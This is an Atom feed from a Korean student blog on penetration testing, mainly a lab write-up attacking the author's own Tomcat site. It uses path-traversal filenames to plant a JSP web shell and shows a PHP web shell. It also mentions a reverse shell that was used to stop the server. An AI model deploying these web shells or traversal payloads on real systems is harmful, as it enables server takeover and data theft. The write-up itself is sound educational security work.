<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-06-07T00:21:24+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">File Upload 공격 실습 (2)</title><link href="http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B5(2)/" rel="alternate" type="text/html" title="File Upload 공격 실습 (2)" /><published>2023-06-06T00:00:00+09:00</published><updated>2023-06-06T23:13:00+09:00</updated><id>http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B5(2)</id><content type="html" xml:base="http://localhost:4000/FileUpload%EC%8B%A4%EC%8A%B5(2)/"><![CDATA[<h2 id="취약점-사이트">취약점 사이트</h2>
<ul>
  <li>내가 만든 웹 사이트를 이용하였다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c46d4050-cc28-43ea-8e0f-0fca6023ca7f" alt="Pasted image 20230606142017" /></li>
</ul>

<h2 id="서버-탐색-및-취약점-탐색">서버 탐색 및 취약점 탐색</h2>

<h3 id="서버-버전-확인">서버 버전 확인</h3>
<ul>
  <li>
    <p>우분투에서 동작하고 nginx 웹 서버라는 것을 알 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9d0d03ec-9386-43c7-acd8-615572156ef9" alt="Pasted image 20230606115619" /></p>
  </li>
  <li>일부러 URL 주소를 이상하게 입력하여 404 페이지에 접속하면 WAS로 apache tomcat을 사용하는 것을 확인할 수 있다. 서버에서 사용중인 tomcat 버전( 10.1.9 )도 확인이 가능하다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/72d5bac4-509e-4304-b778-efd32e68f365" alt="Pasted image 20230606161309" /></li>
  <li>즉 웹 서버는 nginx + tomcat 로 구성되었다는 것을 알 수 있다.</li>
</ul>

<h3 id="file-upload--확장자-">File Upload ( 확장자 )</h3>
<ul>
  <li>
    <p>어느 확장자이든 모두 업로드가 가능하다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0bb2ffbe-e2cc-475b-a27f-996f02ccc93c" alt="Pasted image 20230606192747" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/adea29b3-d8a4-4bad-a496-d1cf05edec45" alt="Pasted image 20230606192657" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/13ec695b-bd36-418f-9b62-4c5bf5839520" alt="Pasted image 20230606181012" /></p>
  </li>
  <li>
    <p>즉 이 웹서버는 확장자를 필터링 하지않는다.</p>
  </li>
</ul>

<h3 id="file-upload-취약점-traversal">File Upload 취약점 (traversal)</h3>
<ul>
  <li>게시글을 올릴 때 파일 업로드도 같이 할 수 있다. 여기서 공격자가 파일의 이름을 바꾸어 파일 위치를 공격자가 마음데로 설정할 수 있는 traversal 우회방법을 발견하였다.</li>
  <li>정상적으로 파일이름이 설정되었을 경우. 게시글에 첨부파일이 잘 올라간 것을 확인할 수 있다. <br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2efa9f9e-2b44-46dd-921b-c8f06c40b0af" alt="Pasted image 20230606153031" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2dad52ea-1455-4f15-a393-64f04439ff8d" alt="Pasted image 20230606153110" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c603ea41-bdd2-4b67-b70f-65b14f5723a3" alt="Pasted image 20230606160012" /></li>
  <li>현재 디렉토리를 뜻하는 <code class="language-plaintext highlighter-rouge">./</code> 를 파일 이름에 붙여 업로드 하는경우. 앞의 상황과 마찬가지로 첨부파일이 잘 올라갔고 다운로드도 잘되는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e840920f-7033-4c5a-9404-829c4d72007b" alt="Pasted image 20230606155610" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/41212880-4694-4594-8878-20d90d033e19" alt="Pasted image 20230606155621" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8f0ddb37-aa7d-4699-8069-6101f328a0fc" alt="Pasted image 20230606160009" /></li>
  <li>이렇게 업로드 경로를 공격자 마음대로 바꿀 수 있다.</li>
</ul>

<h3 id="파일-업로드-위치-파악하기--예측하기-">파일 업로드 위치 파악하기 ( 예측하기 )</h3>
<ul>
  <li>다운로드 링크를 통해서는 어디에 저장되었는지 정확히 파악하기 힘들다.<br /><code class="language-plaintext highlighter-rouge">http://221.27.0.6/main_page/notice_board/notice_file_download?downlink=test.png&amp;pageid=129</code></li>
  <li>
    <p>웹 서버와 파일 업로드 서버 위치가 물리적으로 분리되어 있다면 공격자는 웹쉘 코드에 접근할 수 없다. 즉 공격을 성공할 수가 없다. 따라서 여기서는 웹 서버와 파일 업로드 서버 위치가 동일한 것으로 가정하였다.</p>
  </li>
  <li>tomcat 파일 구조 파악하기. 폴더만 표시하였다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache-tomcat-10.1.9/
├── bin
├── conf
├── lib
├── logs
├── temp
├── webapps
└── work
</code></pre></div></div>

<ul>
  <li>webapps 폴더에 공격자가 만든 jsp 파일을 올려주어야 공격자가 jsp 파일에 접근이 가능하다.</li>
</ul>

<h4 id="파일-업로드-폴더-구조-예측">파일 업로드 폴더 구조 예측</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 업로드 폴더+게시글 구분 &gt; 파일 저장

2. 업로드 폴더 &gt; 게시글 구분 &gt; 파일 저장
</code></pre></div></div>

<h4 id="파일-업로드-폴더-위치-후보-1">파일 업로드 폴더 위치 후보 1</h4>
<ul>
  <li>webapps &gt; ROOT &gt; WEB-INF &gt; 업로드 폴더</li>
  <li>WEB-INF 폴더에 있는 파일들은 링크를 통해 외부에서 접근이 불가능 하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webapps
└── ROOT
    └── WEB-INF
        └── 업로드 폴더
</code></pre></div></div>

<h5 id="업로드-폴더-구조-1-일-때">업로드 폴더 구조 (1) 일 때.</h5>
<ul>
  <li>다음과 같이 파일 이름을 주면 사용자는 링크를 통해 파일에 접근이 가능하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webapps
└── ROOT
    └── WEB-INF
        └── 업로드 폴더+게시글 구분
../../../파일이름

http://221.27.0.6/minqtest.png
</code></pre></div></div>
<ul>
  <li>테스트 업로드 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/1f5210e8-e942-407a-aa3a-6eb37624a017" alt="Pasted image 20230606181001" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/beb12c24-0acb-4617-ab5a-b7622a79b2ee" alt="Pasted image 20230606181012" /></li>
  <li>url 로 접근 테스트 404 페이지 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c60d0b70-4457-4720-8291-b2728f1342d9" alt="Pasted image 20230606181136" /></li>
</ul>

<h5 id="업로드-폴더-구조-2-일-때">업로드 폴더 구조 (2) 일 때.</h5>
<ul>
  <li>다음과 같이 파일 이름을 주면 사용자는 링크를 통해 파일에 접근이 가능하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webapps
└── ROOT
    └── WEB-INF
        └── 업로드 폴더
            └── 게시글 구분
../../../../파일이름

http://221.27.0.6/minqtest.png
</code></pre></div></div>

<ul>
  <li>
    <p>업로드 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2f7bb2fd-00b2-4852-bfa9-4d1ba08c041a" alt="Pasted image 20230606181643" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/68931607-ae04-4188-a914-1da0334ffa95" alt="Pasted image 20230606181012" /></p>
  </li>
  <li>
    <p>url 접근 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b538afb7-0390-4abd-a069-46fb6bcd81a9" alt="Pasted image 20230606181136" /></p>
  </li>
</ul>

<h4 id="파일-업로드-폴더-위치-후보-2">파일 업로드 폴더 위치 후보 2</h4>
<ul>
  <li>apache-tomcat-10.1.9 와 같은 위치.</li>
  <li>사용자는 링크를 통해 파일에 바로 접근이 불가능 하다.</li>
  <li>이 방법을 성공할려면 먼저 톰캣 폴더명을 알아야한다. 웹 서버에서 톰캣 폴더명을 바꿨으면 불가능한 방법이다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
├── apache-tomcat-10.1.9
└── 업로드 폴더
</code></pre></div></div>

<h5 id="업로드-폴더-구조-1-일-때-1">업로드 폴더 구조 (1) 일 때.</h5>
<ul>
  <li>파일 이름</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
├── apache-tomcat-10.1.9
└── 업로드 폴더+게시글 구분
../apache-tomcat-10.1.9/파일이름

http://221.27.0.6/minqtest.png
</code></pre></div></div>
<ul>
  <li>파일 업로드 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2d3fca2e-0760-4746-bfdb-0684f021a4cc" alt="Pasted image 20230606182556" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0097678b-a59c-4a2b-9e43-99f69b9db121" alt="Pasted image 20230606183701" /></li>
</ul>

<h5 id="업로드-폴더-구조-2-일-때-1">업로드 폴더 구조 (2) 일 때.</h5>
<ul>
  <li>파일 이름</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.
├── apache-tomcat-10.1.9
└── 업로드 폴더
    └── 게시글 구분
../../apache-tomcat-10.1.9/파일이름

http://221.27.0.6/minqtest.png
</code></pre></div></div>

<ul>
  <li>파일 업로드 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5ea0c765-d121-4113-9b60-463095febca6" alt="Pasted image 20230606183741" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0097678b-a59c-4a2b-9e43-99f69b9db121" alt="Pasted image 20230606183701" /></li>
</ul>

<h4 id="파일-업로드-폴더-위치-후보-3">파일 업로드 폴더 위치 후보 3</h4>
<ul>
  <li>apache-tomcat-10.1.9 &gt; 업로드 폴더</li>
  <li>apache-tomcat-10.1.9 폴더에 있으면 사용자는 링크를 통해 파일에 바로 접근이 불가능하다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache-tomcat-10.1.9/
├── bin
├── conf
├── lib
├── logs
├── temp
├── webapps
├── work
└── 업로드 폴더
</code></pre></div></div>

<h5 id="업로드-폴더-구조-1-일-때-2">업로드 폴더 구조 (1) 일 때.</h5>
<ul>
  <li>파일 이름</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache-tomcat-10.1.9/
└── 업로드 폴더 + 게시글 구분

../webapps/파일이름
</code></pre></div></div>

<ul>
  <li>파일 업로드 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8e3f118f-d751-4862-8fe5-244451464542" alt="Pasted image 20230606184017" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0097678b-a59c-4a2b-9e43-99f69b9db121" alt="Pasted image 20230606183701" /></li>
</ul>

<h5 id="업로드-폴더-구조-2-일-때-2">업로드 폴더 구조 (2) 일 때.</h5>
<ul>
  <li>파일 이름</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache-tomcat-10.1.9/
└── 업로드 폴더    
    └── 게시글 구분

../../webapps/파일이름
</code></pre></div></div>

<ul>
  <li>
    <p>파일 업로드 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/efda89a2-8c4f-4e35-b164-c4512ea11276" alt="Pasted image 20230606184515" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/09fc501b-58fe-42a0-9570-a3a908960337" alt="Pasted image 20230606184506" /></p>
  </li>
  <li>
    <p>url 접근 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/75cfe84d-14e7-44bb-8d56-31a5150c3b84" alt="Pasted image 20230606181136" /></p>
  </li>
  <li>
    <p>url 통해 접근은 실패하였지만 업로드 폴더 위치를 파악할 수 있었다.</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache-tomcat-10.1.9/
├── webapps
└── 업로드 폴더    
    └── 게시글 구분 
		└── 업로드 파일
</code></pre></div></div>

<h2 id="파일-업로드-위치">파일 업로드 위치</h2>
<ul>
  <li>예측을 통해 업로드 위치를 알 수 있었다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apache-tomcat-10.1.9/
├── webapps
└── 업로드 폴더    
    └── 게시글 구분 
		└── 업로드 파일
</code></pre></div></div>

<ul>
  <li>
    <p>webapps 의 ROOT 폴더에 넣어도 링크를 통해 바로 업로드한 파일로 접근이 안된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/af22a868-5681-40f3-8ece-461180d7a863" alt="Pasted image 20230606191318" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/640b1f30-d8e5-4387-94b8-a8e9be30991e" alt="Pasted image 20230606191326" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/732aa0f9-ddad-4de7-8a74-1b953c7e5f70" alt="Pasted image 20230606191344" /></p>
  </li>
  <li>tomcat 을 다운받았을 때 webapps 에 디펄트로 존재하는 폴더를 이용해 보았다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fd1fe366-8e57-4acb-a59e-9ed0f4d12755" alt="Pasted image 20230606191728" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/87f5322d-9929-43aa-9087-73f11a27ec8e" alt="Pasted image 20230606192006" /></li>
  <li>ROOT 폴더가 아닌 docs 폴더에 업로드 파일 넣기 성공.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/60be46c1-b391-4db9-affa-5341e173449e" alt="Pasted image 20230606192124" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/62374466-f5ad-4cf2-b1aa-dd1faecbeba6" alt="Pasted image 20230606191326" /></li>
  <li>링크를 통해 업로드한 파일에 접근을 성공하였다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/cf906ee9-78f1-40ba-807a-e58642ed14cd" alt="Pasted image 20230606192419" /></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://221.27.0.6/docs/minqtest.png
</code></pre></div></div>

<h3 id="최종-파일-이름">최종 파일 이름</h3>

<ul>
  <li>업로드 파일 이름<br /> <code class="language-plaintext highlighter-rouge">../../webapps/docs/파일이름</code></li>
</ul>

<h2 id="공격-시작">공격 시작</h2>

<h3 id="웹-쉘-업로드-하기--바인드-쉘-">웹 쉘 업로드 하기 ( 바인드 쉘 )</h3>

<h4 id="jsp-웹-쉘">JSP 웹 쉘</h4>
<ul>
  <li>웹 쉘을 올려 공격자가 실행시킬 수 있는지 확인한다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
<span class="k">try</span> <span class="o">{</span>
	<span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span>
	<span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
	<span class="kt">int</span> <span class="n">c</span><span class="o">;</span>
	<span class="k">while</span><span class="o">((</span><span class="n">c</span><span class="o">=</span><span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">())!=-</span><span class="mi">1</span><span class="o">){</span>
		<span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">c</span><span class="o">);</span>
	<span class="o">}</span>
	<span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
	<span class="k">try</span> <span class="o">{</span>
		<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
	<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
		<span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
	<span class="o">}</span>
<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
	<span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
<span class="o">}</span>
<span class="nt">%&gt;</span>
</code></pre></div></div>

<ol>
  <li>
    <p>jsp 웹 쉘을 업로드한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4c133a65-393e-43be-86b8-08553e1c2c50" alt="Pasted image 20230606195407" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a3cfbd33-bff3-43c2-b8aa-68d8fc8c5a2c" alt="Pasted image 20230606195423" /></p>
  </li>
  <li>
    <p>url 을 통해 webshell.jsp 에 접속해본다.<br /><code class="language-plaintext highlighter-rouge">http://221.27.0.6/docs/webshell.jsp?cmd=pwd</code><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/a318901d-326a-44ea-98f2-c3b5bbf83850" alt="Pasted image 20230606201228" /><br /><code class="language-plaintext highlighter-rouge">cmd=ls+-al</code><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4934410f-e7fc-4d50-bc79-07c81c9fec5c" alt="Pasted image 20230606201827" /></p>
  </li>
</ol>

<h3 id="리버스-쉘-코드-업로드하기">리버스 쉘 코드 업로드하기.</h3>
<script src="https://gist.github.com/MinGyu2/356c116c38107dc26dbd5ff31dc3f1cd.js"></script>
<p><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c855c5d1-d3d0-4bbb-8095-f33bd45bca56" alt="Pasted image 20230606234740" /></p>

<ol>
  <li>공격자 서버는 웹 서버가 접속할 수 있도록 포트를 열어준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d68a6ce0-b18c-4e86-a091-5400f174eeea" alt="Pasted image 20230606231634" /></li>
  <li>리버스 쉘 코드를 업로드하여 공격자 서버와 연결한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4bcb265e-50f0-4d04-bfff-5f67aae98866" alt="Pasted image 20230606231512" /></li>
  <li>명령어를 입력하여 잘 연결되었는지 확인한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0af64267-ed35-4fea-acda-a5f2089ce709" alt="Pasted image 20230606232200" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9fa04adf-f351-481f-bc73-4023cd2b9f6f" alt="Pasted image 20230606232217" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/fc383ef4-0103-4030-a01f-0781d644b3cf" alt="Pasted image 20230606233706" /></li>
  <li>리버스 쉘은 진짜 리눅스 터미널에서 명령을 입력하듯 사용하면된다.</li>
  <li>명령을 통해 웹 서버를 종료 시켜 보자. 관리자 권한이 없기 때문에 nginx 서버를 종료를 못시킨다. 따라서 일단 톰캣 서버를 종료시켜 보았다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/c2cd3afd-1a6a-423d-91bd-2453b8070b3c" alt="Pasted image 20230606233814" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/33379e9d-9cf5-4eea-a8fc-b7c3bcf5106d" alt="Pasted image 20230606233825" /><br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/87fc6d7f-f3bd-42d0-a6be-da5d24c95d00" alt="Pasted image 20230606233858" /></li>
</ol>

<h2 id="후기">후기</h2>
<ul>
  <li>File Upload 기능을 직접 구현하고 직접 File Upload 공격법을 시도해 보았다. 처음에는 취약점이 없을 텐데라고 생각하여 실습을 위해 일부러 취약점을 만들어야 하나 라고 생각하였다. 하지만 File Upload 의 traversal 우회기법을 사용하여 파일 업로드 위치를 공격자가 링크를 통하여 접근할 수 있는 위치로 설정할 수 있었다. 취약점 없다고 먼저 단정짓지말고 먼저 열심히 찾아보고 있는 없는지를 판단해야 겠다는 생각이 들었다.</li>
  <li>윈도우에서 리버스 쉘을 작성을 하였을 때 악성 코드로 백신이 인식하여 삭제하는 참사가 있었다. 좀 당황하였지만 윈도우에 코드를 바로 저장하지 않고 메모장에 작성만 해놓았다가 burp suite 로 파일 업로드 할 때 파일 내용을 리버스 쉘 코드로 바꿔 주었다.</li>
  <li>리버스 쉘이라는 이름을 듣고 처음에는 서버가 공격자 서버로 명령을 내리는 건가 라고 생각하였다. 하지만 리버스 쉘 코드를 보고 소켓을 통해 공격자 서버와 연결한 것이라는 것을 알 수 있었다.</li>
  <li>웹 쉘 코드를 웹 서버에 업로드하여 명령을 실행할 때도 엄청 신기하였는데 리버스 쉘 코드를 서버로 업로드하여 실제 서버와 ssh 연결한 것 처럼 명령을 주고 받으니 엄청 신기하였다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://github.com/LaiKash/JSP-Reverse-and-Web-Shell/blob/main/shell.jsp">JSP-Reverse-and-Web-Shell/shell.jsp at main · LaiKash/JSP-Reverse-and-Web-Shell (github.com)</a></li>
  <li><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell (github.com)</a></li>
  <li><a href="https://velog.io/@hunjison/nc-%EC%9D%B4%EC%9A%A9%ED%95%98%EA%B8%B0%EB%B0%94%EC%9D%B8%EB%93%9C%EC%89%98-%EB%A6%AC%EB%B2%84%EC%8A%A4%EC%89%98-%EC%BB%A4%EB%A7%A8%EB%93%9C-%EC%8B%A4%ED%96%89">nc 이용하기(바인드쉘, 리버스쉘, 커맨드 실행) (velog.io)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="file upload" /><category term="웹쉘" /><category term="리버스 쉘" /><summary type="html"><![CDATA[File Upload 취약점을 찾고 공격을 시도해보자.]]></summary></entry><entry><title type="html">File Upload 공격 세부 정리</title><link href="http://localhost:4000/FileUpload%EA%B3%B5%EA%B2%A9%EC%84%B8%EB%B6%80%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="File Upload 공격 세부 정리" /><published>2023-06-05T00:00:00+09:00</published><updated>2023-06-05T23:13:00+09:00</updated><id>http://localhost:4000/FileUpload%EA%B3%B5%EA%B2%A9%EC%84%B8%EB%B6%80%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/FileUpload%EA%B3%B5%EA%B2%A9%EC%84%B8%EB%B6%80%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="file-upload-공격이란">File Upload 공격이란?</h2>
<ul>
  <li>공격자가 임의의 파일을 업로드할 수 있는 공격이다.</li>
  <li>웹쉘을 서버에 업로드하여 서버를 장악할 수 있다.</li>
</ul>

<h2 id="웹쉘-이란">웹쉘 이란?</h2>
<ul>
  <li>서버측에서 실행될 수 있는 코드이다.</li>
  <li>php, jsp, asp, python 등이 있다. 서버의 환경에 따라 달라진다.</li>
  <li>서버환경에 맞게 웹 쉘을 제작하여야 한다.</li>
</ul>

<h3 id="php-웹-쉘">PHP 웹 쉘</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="jsp-웹-쉘">JSP 웹 쉘</h3>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">import=</span><span class="s">"java.io.*"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;%</span>
<span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="nc">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="nc">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="kt">int</span> <span class="n">c</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">while</span><span class="o">((</span><span class="n">c</span><span class="o">=</span><span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">())!=-</span><span class="mi">1</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">c</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
<span class="o">}</span>
<span class="nt">%&gt;</span>
</code></pre></div></div>

<h2 id="공격-성공을-위한-중요-point">공격 성공을 위한 중요 Point!</h2>
<ul>
  <li>공격자는 웹 서버에서 동작할 수 있는 파일을 올릴 수 있어야한다. (  jsp, php, asp, python 등등 )</li>
  <li>공격자는 업로드한 파일을 실행시킬 수 있어야한다.</li>
</ul>

<h2 id="공격-유형">공격 유형</h2>

<h3 id="소스코드-탈취">소스코드 탈취</h3>
<ul>
  <li>소스코드 안에 DB의 계정정보가 적혀있을 수 있다. ( DB 서버 아이디 , 비밀번호 ) 이러한 정보들을 통해 서버의 DB 데이터를 탈취하는 것이다.</li>
